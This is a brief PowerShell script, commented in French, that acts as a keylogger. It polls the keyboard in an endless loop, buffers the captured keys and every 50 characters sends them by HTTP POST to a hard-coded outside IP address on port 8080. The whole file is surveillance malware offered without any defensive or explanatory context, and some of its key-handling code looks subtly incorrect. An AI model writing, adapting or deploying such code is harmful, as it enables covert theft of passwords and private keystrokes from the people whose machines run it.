$serverUrl = "http://20.121.45.132:8080"
$log = ""

# Fonction pour envoyer les données au serveur
function Send-Data {
    param ([string]$data)
    $body = @{ "data" = $data }
    Invoke-WebRequest -Uri $serverUrl -Method POST -Body $body
}

# Boucle pour capturer les frappes
while ($true) {
    Start-Sleep -Milliseconds 100
    for ($key = 8; $key -le 254; $key++) {
        $state = [Windows.Input.Keyboard]::IsKeyDown($key)
        if ($state) {
            $char = [char]$key
            $log += $char
            if ($log.Length -ge 50) {
                Send-Data -data $log
                $log = ""
            }
        }
    }
}